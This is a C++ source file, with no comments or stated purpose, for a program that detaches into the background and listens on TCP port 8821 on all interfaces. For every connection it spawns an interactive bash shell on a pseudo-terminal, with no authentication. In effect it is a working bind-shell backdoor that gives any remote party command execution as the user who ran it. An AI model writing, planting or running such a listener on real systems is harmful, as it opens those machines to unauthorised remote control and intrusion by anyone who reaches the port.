#include<sys/socket.h>
#include<fcntl.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<sys/types.h>
#include<netdb.h>
#include<unistd.h>
#include<iostream>
#include<pty.h>
#include<utmp.h>

void write_(int fd, char* buffer, size_t sz) {
    size_t counter = 0;
    while (counter < sz) {
        int write_counter = write(fd, buffer + counter, sz - counter);
        if (write_counter < 0)
            return;
        counter += write_counter;
    }
}
int main () {
    if (fork() == 0) {
        setsid();
        struct addrinfo hints;
        struct addrinfo *result;
        int sfd, s;
        memset(&hints, 0, sizeof(struct addrinfo));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        hints.ai_protocol = 0;
        s = getaddrinfo(NULL, "8821", &hints, &result);
        if (s != 0) {
            fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
            exit(EXIT_FAILURE);
        }
        struct addrinfo *rp;
        for (rp  = result; rp != NULL; rp = rp->ai_next) {
            sfd = socket(rp->ai_family, rp->ai_socktype,
                    rp->ai_protocol);
            if (sfd == -1)
                continue;
            if (bind(sfd, rp->ai_addr, rp->ai_addrlen) == 0)
                break;
            close(sfd);
        }
        if (rp == NULL) {
            std::cerr << "Could not bind" << std::endl;
            exit(EXIT_FAILURE);
        }
        freeaddrinfo(result);
        int opt = 1;
        if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &opt,
                    sizeof(int)) != 0) {
            std::cerr << "Could not set socket optins" << std::endl;
            exit(EXIT_FAILURE);
        }
        if (listen(sfd, 10) != 0) {
            std::cerr << "Could not listen" << std::endl;
            exit(EXIT_FAILURE);
        }
        int sockfd;
        sockaddr saddr;
        socklen_t addrlen = sizeof(saddr);
        while (true) {
            sockfd = accept(sfd, &saddr, &addrlen);
            if (sockfd == -1) {
                std::cerr << "Could not accept" << std::endl;
                exit(EXIT_FAILURE);
            }
            pid_t fork_val = fork();
            if (fork_val) {// parent
                close(sockfd);
            } else {// child
                close(0);
                close(1);
                close(2);
                //close(sockfd);
                int master, slave;
                char buf[4096];
                openpty(&master, &slave, buf, NULL, NULL);
                fcntl(sfd, F_SETFL, fcntl(sfd, F_GETFL) | O_NONBLOCK);
                fcntl(master, F_SETFL, fcntl(master, F_GETFL)
                        | O_NONBLOCK);
                if (fork()) {
                    close(slave);
                    char* buffer = (char*) malloc(4096);
                    while (true) {
                        int read_count = read(master, buffer, 4096);
                        if (read_count > 0) {
                            write_(sockfd, buffer, read_count);
                        }
                        read_count = read(sockfd, buffer, 4096);
                        if (read_count > 0) {
                            write_(master, buffer, read_count);
                        }
                        sleep(5);
                    }
                    free(buffer);
                    close(master);
                    close(sockfd);
                } else {
                    close(master);
                    close(sockfd);
                    int ft = open(buf, O_RDWR);
                    close(ft);
                    setsid();
                    dup2(slave, 0);
                    dup2(slave, 1);
                    dup2(slave, 2);
                    execl("/bin/bash","bash", NULL);
                }
            }
        }
    }
    return 0; 
}
